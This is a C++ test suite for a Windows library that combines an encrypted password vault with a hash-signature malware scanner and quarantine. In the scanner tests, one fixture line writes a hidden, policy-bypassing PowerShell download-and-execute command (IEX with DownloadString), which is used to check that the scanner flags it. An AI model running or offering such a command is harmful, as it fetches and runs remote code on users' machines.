// Self-contained tests for Veyl.Core. Exit code 0 = all passed.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <atomic>
#include <cstdio>
#include <fstream>
#include <string>
#include <vector>

#include "veyl_core.h"

static int failures = 0;
#define CHECK(cond)                                                   \
    do {                                                              \
        if (!(cond)) {                                                \
            std::printf("FAIL %s:%d  %s\n", __FILE__, __LINE__, #cond); \
            ++failures;                                               \
        }                                                             \
    } while (0)

static std::wstring temp_dir() {
    wchar_t base[MAX_PATH];
    GetTempPathW(MAX_PATH, base);
    std::wstring dir = std::wstring(base) + L"veyl_tests_" + std::to_wstring(GetCurrentProcessId());
    CreateDirectoryW(dir.c_str(), nullptr);
    return dir;
}

static void write_bytes(const std::wstring& path, const std::string& data) {
    std::ofstream(path, std::ios::binary).write(data.data(), (std::streamsize)data.size());
}

static std::string read_bytes(const std::wstring& path) {
    std::ifstream in(path, std::ios::binary);
    return std::string(std::istreambuf_iterator<char>(in), {});
}

static std::wstring to_w(const char* s) { return std::wstring(s, s + strlen(s)); }

static std::wstring field(VeylVault* v, int i, int f) {
    wchar_t buf[512];
    int len = 512;
    return veyl_vault_get_field(v, i, f, buf, &len) == VEYL_OK ? buf : L"<err>";
}

static void test_hash(const std::wstring& dir) {
    std::wstring p = dir + L"\\abc.txt";
    write_bytes(p, "abc");
    char hex[65];
    CHECK(veyl_sha256_file(p.c_str(), hex) == VEYL_OK);
    CHECK(std::string(hex) == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
}

static void test_generator() {
    wchar_t buf[65];
    CHECK(veyl_generate_password(buf, 64, VEYL_GEN_LOWER | VEYL_GEN_UPPER | VEYL_GEN_DIGITS | VEYL_GEN_SYMBOLS) == VEYL_OK);
    CHECK(wcslen(buf) == 64);
    wchar_t buf2[65];
    veyl_generate_password(buf2, 64, VEYL_GEN_LOWER | VEYL_GEN_UPPER | VEYL_GEN_DIGITS | VEYL_GEN_SYMBOLS);
    CHECK(wcscmp(buf, buf2) != 0);
    CHECK(veyl_generate_password(buf, 8, 0) == VEYL_ERR_ARG);
    CHECK(veyl_generate_password(buf, 16, VEYL_GEN_DIGITS) == VEYL_OK);
    for (int i = 0; i < 16; ++i) CHECK(iswdigit(buf[i]));
}

static void test_vault(const std::wstring& dir) {
    std::wstring path = dir + L"\\vault.veyl";
    const wchar_t pw[] = L"correct horse battery staple ✓";
    const int pw_len = (int)wcslen(pw);

    VeylVault* v = nullptr;
    CHECK(veyl_vault_create(path.c_str(), pw, pw_len, &v) == VEYL_OK);
    VeylVault* dup = nullptr;
    CHECK(veyl_vault_create(path.c_str(), pw, pw_len, &dup) == VEYL_ERR_EXISTS && !dup);  // never overwrite

    wchar_t id[37];
    const wchar_t secret[] = L"hunter2-ü";
    CHECK(veyl_vault_add(v, L"GitHub", L"dan", secret, (int)wcslen(secret), L"https://github.com", L"notes", id) == VEYL_OK);
    wchar_t id2[37];
    CHECK(veyl_vault_add(v, L"Email", L"dan@example.com", L"pw2", 3, L"", L"", id2) == VEYL_OK);
    CHECK(veyl_vault_save(v) == VEYL_OK);
    veyl_vault_close(v);

    // Reopen with the right password.
    v = nullptr;
    CHECK(veyl_vault_open(path.c_str(), pw, pw_len, &v) == VEYL_OK);
    CHECK(v && veyl_vault_count(v) == 2);
    if (v) {
        CHECK(field(v, 0, VEYL_FIELD_TITLE) == L"GitHub");
        CHECK(field(v, 0, VEYL_FIELD_USERNAME) == L"dan");
        CHECK(field(v, 0, VEYL_FIELD_ID) == id);
        // Password must not be readable through the generic field getter.
        wchar_t tmp[64];
        int tl = 64;
        CHECK(veyl_vault_get_field(v, 0, VEYL_FIELD_PASSWORD, tmp, &tl) == VEYL_ERR_ARG);

        wchar_t revealed[64];
        int len = 64;
        CHECK(veyl_vault_reveal_password(v, id, revealed, &len) == VEYL_OK);
        CHECK(std::wstring(revealed) == secret);
        int small = 2;
        CHECK(veyl_vault_reveal_password(v, id, revealed, &small) == VEYL_ERR_BUFFER && small == (int)wcslen(secret) + 1);

        CHECK(veyl_vault_update(v, id, L"GitHub (work)", L"dan", nullptr, 0, L"", L"") == VEYL_OK);
        len = 64;
        veyl_vault_reveal_password(v, id, revealed, &len);
        CHECK(std::wstring(revealed) == secret);  // NULL password keeps the old one
        CHECK(veyl_vault_delete(v, id2) == VEYL_OK);
        CHECK(veyl_vault_delete(v, id2) == VEYL_ERR_NOT_FOUND);
        CHECK(veyl_vault_change_password(v, L"new-pw", 6) == VEYL_OK);
        veyl_vault_close(v);
    }

    // Old password no longer works, new one does.
    v = nullptr;
    CHECK(veyl_vault_open(path.c_str(), pw, pw_len, &v) == VEYL_ERR_AUTH);
    CHECK(veyl_vault_open(path.c_str(), L"new-pw", 6, &v) == VEYL_OK);
    if (v) {
        CHECK(veyl_vault_count(v) == 1);
        CHECK(field(v, 0, VEYL_FIELD_TITLE) == L"GitHub (work)");
        veyl_vault_close(v);
    }

    // Wrong password -> auth failure, not garbage.
    v = nullptr;
    CHECK(veyl_vault_open(path.c_str(), L"wrong", 5, &v) == VEYL_ERR_AUTH && v == nullptr);

    // Flip one ciphertext byte -> auth failure.
    std::string bytes = read_bytes(path);
    std::wstring tampered = dir + L"\\tampered.veyl";
    bytes[50] ^= 0x01;
    write_bytes(tampered, bytes);
    CHECK(veyl_vault_open(tampered.c_str(), L"new-pw", 6, &v) == VEYL_ERR_AUTH);

    // Tamper with the header (iteration count) -> also rejected (it is AAD).
    bytes = read_bytes(path);
    bytes[12] ^= 0x01;
    write_bytes(tampered, bytes);
    CHECK(veyl_vault_open(tampered.c_str(), L"new-pw", 6, &v) == VEYL_ERR_AUTH);

    // Not a vault.
    write_bytes(tampered, std::string(100, 'x'));
    CHECK(veyl_vault_open(tampered.c_str(), L"new-pw", 6, &v) == VEYL_ERR_FORMAT);
}

static void test_recovery(const std::wstring& dir) {
    std::wstring path = dir + L"\\rec.veyl";
    VeylVault* v = nullptr;
    CHECK(veyl_vault_create(path.c_str(), L"first-pass", 10, &v) == VEYL_OK);
    CHECK(veyl_vault_has_recovery(v) == 0);
    wchar_t id[37];
    veyl_vault_add(v, L"Bank", L"me", L"bank-pw", 7, L"", L"", id);
    veyl_vault_save(v);

    // No recovery key yet.
    VeylVault* r = nullptr;
    CHECK(veyl_vault_open_recovery(path.c_str(), L"0000-0000-0000-0000-0000-0000-0000-0000", 39, &r) == VEYL_ERR_STATE);

    wchar_t key[40];
    CHECK(veyl_vault_set_recovery(v, key) == VEYL_OK);
    CHECK(wcslen(key) == 39 && key[4] == L'-');
    CHECK(veyl_vault_has_recovery(v) == 1);
    veyl_vault_close(v);

    // Recovery key opens it, in any case and with spaces instead of dashes.
    std::wstring messy = key;
    for (auto& c : messy) c = c == L'-' ? L' ' : towlower(c);
    CHECK(veyl_vault_open_recovery(path.c_str(), messy.c_str(), (int)messy.size(), &r) == VEYL_OK);
    if (r) {
        CHECK(veyl_vault_count(r) == 1);
        // Forgot password flow: set a new master password from the recovery session.
        CHECK(veyl_vault_change_password(r, L"second-pass", 11) == VEYL_OK);
        veyl_vault_close(r);
    }

    // Old password gone, new password works, recovery key still works.
    v = nullptr;
    CHECK(veyl_vault_open(path.c_str(), L"first-pass", 10, &v) == VEYL_ERR_AUTH);
    CHECK(veyl_vault_open(path.c_str(), L"second-pass", 11, &v) == VEYL_OK);
    if (v) {
        wchar_t pw[32];
        int len = 32;
        CHECK(veyl_vault_reveal_password(v, id, pw, &len) == VEYL_OK && std::wstring(pw) == L"bank-pw");
        veyl_vault_close(v);
    }
    r = nullptr;
    CHECK(veyl_vault_open_recovery(path.c_str(), key, 39, &r) == VEYL_OK);
    veyl_vault_close(r);

    // Wrong recovery key / garbage.
    std::wstring wrong = key;
    wrong[0] = wrong[0] == L'A' ? L'B' : L'A';
    CHECK(veyl_vault_open_recovery(path.c_str(), wrong.c_str(), 39, &r) == VEYL_ERR_AUTH);
    CHECK(veyl_vault_open_recovery(path.c_str(), L"not a key", 9, &r) == VEYL_ERR_AUTH);

    // Regenerating invalidates the old key.
    v = nullptr;
    veyl_vault_open(path.c_str(), L"second-pass", 11, &v);
    wchar_t key2[40];
    CHECK(v && veyl_vault_set_recovery(v, key2) == VEYL_OK && wcscmp(key, key2) != 0);
    veyl_vault_close(v);
    CHECK(veyl_vault_open_recovery(path.c_str(), key, 39, &r) == VEYL_ERR_AUTH);
    CHECK(veyl_vault_open_recovery(path.c_str(), key2, 39, &r) == VEYL_OK);
    veyl_vault_close(r);
}

static void test_v1_migration(const std::wstring& dir) {
    // fixtures/v1.veyl was written by the original (format 1) engine.
    std::wstring path = dir + L"\\legacy.veyl";
    CopyFileW(VEYL_FIXTURES L"\\v1.veyl", path.c_str(), FALSE);
    CHECK(read_bytes(path)[8] == 1);

    VeylVault* v = nullptr;
    CHECK(veyl_vault_open(path.c_str(), L"wrong", 5, &v) == VEYL_ERR_AUTH);
    CHECK(veyl_vault_open(path.c_str(), L"fixture-pw", 10, &v) == VEYL_OK);
    if (!v) return;
    CHECK(veyl_vault_count(v) == 1 && field(v, 0, VEYL_FIELD_TITLE) == L"Legacy");
    veyl_vault_close(v);

    CHECK(read_bytes(path)[8] == 2);                       // migrated on open
    CHECK(read_bytes(path + L".bak")[8] == 1);              // original kept
    CHECK(veyl_vault_open(path.c_str(), L"fixture-pw", 10, &v) == VEYL_OK);
    if (v) {
        wchar_t pw[32];
        int len = 32;
        std::wstring id = field(v, 0, VEYL_FIELD_ID);
        CHECK(veyl_vault_reveal_password(v, id.c_str(), pw, &len) == VEYL_OK && std::wstring(pw) == L"old-secret");
        veyl_vault_close(v);
    }
}

static void test_scanner(const std::wstring& dir) {
    std::wstring sigs = dir + L"\\sigs.txt";
    std::wstring bad = dir + L"\\bad.bin";
    std::wstring good = dir + L"\\good.txt";
    write_bytes(bad, "pretend this is malware 0123456789");
    write_bytes(good, "just a harmless text file");
    char bad_hash[65];
    veyl_sha256_file(bad.c_str(), bad_hash);
    write_bytes(sigs, std::string("# test sigs\n") + bad_hash + " Test.Malware.A\r\n");

    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    CHECK(veyl_scanner_signature_count() == 1);

    VeylScanResult r;
    CHECK(veyl_scan_file(bad.c_str(), &r) == VEYL_OK);
    CHECK(r.verdict == VEYL_MALICIOUS);
    CHECK(std::wstring(r.threat) == L"Test.Malware.A");
    CHECK(veyl_scan_file(good.c_str(), &r) == VEYL_OK);
    CHECK(r.verdict == VEYL_CLEAN);

    // A real signed system binary should come out clean.
    wchar_t sys[MAX_PATH];
    GetSystemDirectoryW(sys, MAX_PATH);
    std::wstring notepad = std::wstring(sys) + L"\\notepad.exe";
    CHECK(veyl_scan_file(notepad.c_str(), &r) == VEYL_OK);
    CHECK(r.verdict == VEYL_CLEAN);

    std::wstring script = dir + L"\\evil.ps1";
    write_bytes(script, "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://x'))\"");
    CHECK(veyl_scan_file(script.c_str(), &r) == VEYL_OK);
    CHECK(r.verdict == VEYL_SUSPICIOUS);

    int files = 0, threats = 0;
    CHECK(veyl_scan_directory(dir.c_str(), nullptr, nullptr, &files, &threats) == VEYL_OK);
    CHECK(files >= 4 && threats == 2);

    // Clean results are cached; threats never are.
    CHECK(veyl_scan_cache_count() > 0);
    CHECK(veyl_scan_file(good.c_str(), &r) == VEYL_OK && r.verdict == VEYL_CLEAN);
    CHECK(std::wstring(r.detail).find(L"Unchanged") == 0);
    CHECK(veyl_scan_file_ex(good.c_str(), VEYL_SCAN_NO_CACHE, &r) == VEYL_OK && std::wstring(r.detail).empty());
    CHECK(veyl_scan_file(bad.c_str(), &r) == VEYL_OK && r.verdict == VEYL_MALICIOUS);

    // Editing a file invalidates its entry.
    write_bytes(good, "now with different contents, longer");
    CHECK(veyl_scan_file(good.c_str(), &r) == VEYL_OK && std::wstring(r.detail).find(L"Unchanged") != 0);

    // Cache survives a save/load while signatures are unchanged.
    std::wstring cache = dir + L"\\scan.cache";
    int before = veyl_scan_cache_count();
    CHECK(veyl_scan_cache_save(cache.c_str()) == VEYL_OK);
    veyl_scan_cache_clear();
    CHECK(veyl_scan_cache_count() == 0);
    CHECK(veyl_scan_cache_load(cache.c_str()) == VEYL_OK && veyl_scan_cache_count() == before);

    // New signatures make cached "clean" answers stale, so the cache empties.
    char good_hash[65];
    veyl_sha256_file(good.c_str(), good_hash);
    CHECK(veyl_scanner_add_signature(to_w(good_hash).c_str(), L"Now.Bad") == VEYL_OK);
    CHECK(veyl_scan_cache_count() == 0);
    CHECK(veyl_scan_file(good.c_str(), &r) == VEYL_OK && r.verdict == VEYL_MALICIOUS);
    // ...and a cache file saved under the old signatures is ignored.
    CHECK(veyl_scan_cache_load(cache.c_str()) == VEYL_OK && veyl_scan_cache_count() == 0);

    // Lots of files through the worker pool, with the callback serialised and cancellable.
    std::wstring many = dir + L"\\many";
    CreateDirectoryW(many.c_str(), nullptr);
    for (int i = 0; i < 300; ++i) write_bytes(many + L"\\f" + std::to_wstring(i) + L".txt", "file " + std::to_string(i));
    struct Ctx { std::atomic<int> calls{0}, inside{0}; bool overlap = false; int stop_at = 0; };
    auto cb = [](const wchar_t*, const VeylScanResult*, void* p) -> int {
        auto c = static_cast<Ctx*>(p);
        if (c->inside++ > 0) c->overlap = true;
        Sleep(0);
        int n = ++c->calls;
        c->inside--;
        return c->stop_at == 0 || n < c->stop_at;
    };
    Ctx all;
    CHECK(veyl_scan_directory_ex(many.c_str(), VEYL_SCAN_NO_CACHE, cb, &all, &files, &threats) == VEYL_OK);
    CHECK(files == 300 && all.calls == 300 && !all.overlap);
    Ctx some;
    some.stop_at = 20;
    veyl_scan_directory_ex(many.c_str(), VEYL_SCAN_NO_CACHE, cb, &some, &files, &threats);
    CHECK(some.calls == 20 && files < 300);
}

static int count_files(const std::wstring& dir, const wchar_t* pattern) {
    WIN32_FIND_DATAW fd;
    int n = 0;
    HANDLE h = FindFirstFileW((dir + L"\\" + pattern).c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;
    do ++n; while (FindNextFileW(h, &fd));
    FindClose(h);
    return n;
}

static VeylScanResult scan(const std::wstring& path) {
    VeylScanResult r{};
    veyl_scan_file_ex(path.c_str(), VEYL_SCAN_NO_CACHE, &r);
    return r;
}

static bool contains(const wchar_t* s, const wchar_t* part) { return std::wstring(s).find(part) != std::wstring::npos; }

// Deterministic, unsorted filler hashes of the given hex length.
static std::string filler(int count, int hex_len, uint64_t seed) {
    std::string out;
    char buf[80];
    for (int i = 0; i < count; ++i) {
        std::string h;
        while ((int)h.size() < hex_len) {
            seed = seed * 6364136223846793005ull + 1442695040888963407ull;
            snprintf(buf, sizeof buf, "%016llx", (unsigned long long)seed);
            h += buf;
        }
        out += h.substr(0, hex_len) + "\n";
    }
    return out;
}

static void test_packs(const std::wstring& dir) {
    std::wstring pdir = dir + L"\\packs";
    CreateDirectoryW(pdir.c_str(), nullptr);
    std::wstring sigs = pdir + L"\\hashes.txt";
    write_bytes(sigs, "# no text signatures\n");

    // Files with well-known digests.
    std::wstring by_md5 = dir + L"\\pk_abc.txt", by_sha1 = dir + L"\\pk_md.txt", by_sha256 = dir + L"\\pk_hello.txt",
                 later = dir + L"\\pk_later.txt";
    write_bytes(by_md5, "abc");             // MD5 900150983cd24fb0d6963f7d28e17f72
    write_bytes(by_sha1, "message digest");  // SHA-1 c12252ceda8be8994d5fa0290a47231c1d16aae3
    write_bytes(by_sha256, "hello");         // SHA-256 2cf24dba...9824
    write_bytes(later, "added in the second version of the pack");

    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    CHECK(veyl_scanner_signature_count() == 0);
    CHECK(scan(by_md5).verdict == VEYL_CLEAN);

    // A VirusShare-style list (bare MD5s, comments) plus a named list, CSV and CRLF.
    std::wstring list1 = dir + L"\\pk_list1.md5", list2 = dir + L"\\pk_list2.txt";
    write_bytes(list1, "# VirusShare style header\r\n" + filler(5000, 32, 1) + "900150983CD24FB0D6963F7D28E17F72\r\n" +
                           "not a hash\nfeedface\n");
    write_bytes(list2, "\xEF\xBB\xBF\"c12252ceda8be8994d5fa0290a47231c1d16aae3\",\"Test.Sha1\"\r\n"
                       "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824 Test.Sha256 named\n"
                       "900150983cd24fb0d6963f7d28e17f72 Test.Md5.Named\n");  // duplicate: the name wins
    const wchar_t* inputs[] = {list1.c_str(), list2.c_str()};
    wchar_t pack1[260];
    int64_t n = 0;
    CHECK(veyl_signature_compile(inputs, 2, L"TestList", pdir.c_str(), pack1, &n) == VEYL_OK);
    CHECK(n == 5000 + 3);
    wchar_t label[64];
    int64_t m5 = 0, s1 = 0, s256 = 0;
    CHECK(veyl_signature_pack_info(pack1, label, &m5, &s1, &s256) == VEYL_OK);
    CHECK(std::wstring(label) == L"TestList" && m5 == 5001 && s1 == 1 && s256 == 1);

    // Nothing that looks like a hash: refused, and no file is left behind.
    std::wstring junk = dir + L"\\pk_junk.txt";
    write_bytes(junk, "hello\nworld\n");
    const wchar_t* junk_in[] = {junk.c_str()};
    CHECK(veyl_signature_compile(junk_in, 1, L"Junk", pdir.c_str(), nullptr, nullptr) == VEYL_ERR_FORMAT);
    CHECK(count_files(pdir, L"*.vdb*") == 1);

    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    CHECK(veyl_scanner_signature_count() == 5003);
    VeylScanResult r = scan(by_md5);
    CHECK(r.verdict == VEYL_MALICIOUS && std::wstring(r.threat) == L"Test.Md5.Named");
    CHECK(contains(r.detail, L"MD5") && contains(r.detail, L"TestList"));
    r = scan(by_sha1);
    CHECK(r.verdict == VEYL_MALICIOUS && std::wstring(r.threat) == L"Test.Sha1" && contains(r.detail, L"SHA-1"));
    r = scan(by_sha256);
    CHECK(r.verdict == VEYL_MALICIOUS && std::wstring(r.threat) == L"Test.Sha256 named");
    CHECK(scan(later).verdict == VEYL_CLEAN);

    // Unnamed entries report the pack label.
    std::wstring bare = dir + L"\\pk_bare.md5";
    write_bytes(bare, "900150983cd24fb0d6963f7d28e17f72\n");
    const wchar_t* bare_in[] = {bare.c_str()};
    CHECK(veyl_signature_compile(bare_in, 1, L"Bare", pdir.c_str(), nullptr, nullptr) == VEYL_OK);

    // Recompiling a label supersedes the old pack. Clean-cache entries go stale.
    VeylScanResult cached;
    CHECK(veyl_scan_file(later.c_str(), &cached) == VEYL_OK && cached.verdict == VEYL_CLEAN);
    char later_hash[65];
    veyl_sha256_file(later.c_str(), later_hash);
    std::wstring list3 = dir + L"\\pk_list3.txt";
    write_bytes(list3, std::string(later_hash) + " Test.Later\n");
    const wchar_t* merge_in[] = {pack1, list3.c_str()};
    wchar_t pack2[260];
    CHECK(veyl_signature_compile(merge_in, 2, L"TestList", pdir.c_str(), pack2, &n) == VEYL_OK);
    CHECK(n == 5004 && std::wstring(pack1) != pack2);
    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    CHECK(veyl_scanner_signature_count() == 5004 + 1);
    CHECK(count_files(pdir, L"*.vdb") == 2);  // TestList (new) + Bare; the old TestList is gone
    CHECK(GetFileAttributesW(pack1) == INVALID_FILE_ATTRIBUTES);
    CHECK(veyl_scan_file(later.c_str(), &r) == VEYL_OK && r.verdict == VEYL_MALICIOUS);
    CHECK(std::wstring(r.threat) == L"Test.Later");

    int found_bare = 0;
    for (int i = 0; veyl_scanner_pack_info(i, label, nullptr, &n, nullptr) == VEYL_OK; ++i)
        if (std::wstring(label) == L"Bare") found_bare = (int)n;
    CHECK(found_bare == 1);

    // Damaged packs are ignored, never trusted.
    std::string good = read_bytes(pack2);
    std::wstring trunc = pdir + L"\\damaged-truncated.vdb", tampered = pdir + L"\\damaged-count.vdb",
                 tiny = pdir + L"\\damaged-tiny.vdb";
    write_bytes(trunc, good.substr(0, good.size() / 2));
    std::string t = good;
    uint64_t huge = 0x00FFFFFFFFFFFFull;
    memcpy(t.data() + 128, &huge, 8);  // sections[0].count (header offset 120 + 8)
    write_bytes(tampered, t);
    write_bytes(tiny, "VEYLSIG1 short");
    CHECK(veyl_signature_pack_info(trunc.c_str(), nullptr, nullptr, nullptr, nullptr) == VEYL_ERR_FORMAT);
    CHECK(veyl_signature_pack_info(tampered.c_str(), nullptr, nullptr, nullptr, nullptr) == VEYL_ERR_FORMAT);
    CHECK(veyl_signature_pack_info(tiny.c_str(), nullptr, nullptr, nullptr, nullptr) == VEYL_ERR_FORMAT);
    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    CHECK(veyl_scanner_signature_count() == 5005);
    DeleteFileW(trunc.c_str());
    DeleteFileW(tampered.c_str());
    DeleteFileW(tiny.c_str());

    // MD5 and SHA-1 in hashes.txt and added at runtime.
    write_bytes(sigs, "c12252ceda8be8994d5fa0290a47231c1d16aae3 Text.Sha1\r\n");
    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    r = scan(by_sha1);
    CHECK(r.verdict == VEYL_MALICIOUS && std::wstring(r.threat) == L"Text.Sha1");
    std::wstring other = dir + L"\\pk_other.txt";
    write_bytes(other, "");  // MD5 d41d8cd98f00b204e9800998ecf8427e
    CHECK(veyl_scanner_add_signature(L"D41D8CD98F00B204E9800998ECF8427E", L"Empty.Md5") == VEYL_OK);
    CHECK(std::wstring(scan(other).threat) == L"Empty.Md5");
    CHECK(veyl_scanner_add_signature(L"d41d8cd98f00b204e9800998ecf8427", L"x") == VEYL_ERR_ARG);

    // Removing a pack unloads it and deletes the file.
    CHECK(veyl_scanner_remove_pack(pack2) == VEYL_OK);
    CHECK(GetFileAttributesW(pack2) == INVALID_FILE_ATTRIBUTES);
    CHECK(scan(later).verdict == VEYL_CLEAN);
    r = scan(by_md5);
    CHECK(r.verdict == VEYL_MALICIOUS && std::wstring(r.threat) == L"Bare");  // still in the Bare pack
    CHECK(veyl_scanner_remove_pack(pack2) == VEYL_ERR_NOT_FOUND);

    // Scale: a million MD5s, VirusShare-sized. Timings are informational.
    std::wstring big = dir + L"\\pk_big.md5";
    write_bytes(big, filler(1000000, 32, 7) + "900150983cd24fb0d6963f7d28e17f72\n");
    const wchar_t* big_in[] = {big.c_str()};
    LARGE_INTEGER f, t0, t1, t2, t3;
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&t0);
    wchar_t big_pack[260];
    CHECK(veyl_signature_compile(big_in, 1, L"Big", pdir.c_str(), big_pack, &n) == VEYL_OK && n == 1000001);
    QueryPerformanceCounter(&t1);
    CHECK(veyl_scanner_init(sigs.c_str(), 0) == VEYL_OK);
    QueryPerformanceCounter(&t2);
    for (int i = 0; i < 200; ++i) scan(by_md5);
    QueryPerformanceCounter(&t3);
    auto ms = [&](LARGE_INTEGER a, LARGE_INTEGER b) { return (b.QuadPart - a.QuadPart) * 1000.0 / f.QuadPart; };
    std::printf("  1M MD5s: compile %.0f ms, load %.1f ms, %.3f ms per file scan\n", ms(t0, t1), ms(t1, t2),
                ms(t2, t3) / 200);
    CHECK(veyl_scanner_signature_count() >= 1000001);
    DeleteFileW(big.c_str());
}

static void test_quarantine(const std::wstring& dir) {
    std::wstring qdir = dir + L"\\quarantine";
    std::wstring victim = dir + L"\\victim.exe";
    std::string content = "MZ fake executable body \x01\x02\x03";
    write_bytes(victim, content);

    wchar_t id[37];
    CHECK(veyl_quarantine_file(victim.c_str(), qdir.c_str(), L"Test.Threat", id) == VEYL_OK);
    CHECK(GetFileAttributesW(victim.c_str()) == INVALID_FILE_ATTRIBUTES);

    std::string stored = read_bytes(qdir + L"\\" + id + L".vq");
    CHECK(stored.find("MZ fake") == std::string::npos);  // body is obfuscated

    wchar_t orig[1024], threat[128];
    int64_t at = 0, size = 0;
    CHECK(veyl_quarantine_info(qdir.c_str(), id, orig, threat, &at, &size) == VEYL_OK);
    CHECK(victim == orig && std::wstring(threat) == L"Test.Threat" && size == (int64_t)content.size() && at > 0);

    CHECK(veyl_quarantine_info(qdir.c_str(), L"..\\..\\x", orig, threat, &at, &size) == VEYL_ERR_ARG);

    CHECK(veyl_quarantine_restore(qdir.c_str(), id, nullptr) == VEYL_OK);
    CHECK(read_bytes(victim) == content);

    CHECK(veyl_quarantine_file(victim.c_str(), qdir.c_str(), L"Test.Threat", id) == VEYL_OK);
    CHECK(veyl_quarantine_delete(qdir.c_str(), id) == VEYL_OK);
    CHECK(veyl_quarantine_info(qdir.c_str(), id, orig, threat, &at, &size) == VEYL_ERR_NOT_FOUND);
}

static void cleanup(const std::wstring& dir) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
            std::wstring p = dir + L"\\" + fd.cFileName;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) cleanup(p);
            else DeleteFileW(p.c_str());
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
    RemoveDirectoryW(dir.c_str());
}

int main() {
    std::wstring dir = temp_dir();
    std::printf("Veyl.Core %s\n", veyl_core_version());
    test_hash(dir);
    test_generator();
    test_vault(dir);
    test_recovery(dir);
    test_v1_migration(dir);
    test_scanner(dir);
    test_packs(dir);
    test_quarantine(dir);
    veyl_scanner_shutdown();
    cleanup(dir);
    std::printf(failures ? "%d FAILURE(S)\n" : "ALL TESTS PASSED\n", failures);
    return failures ? 1 : 0;
}
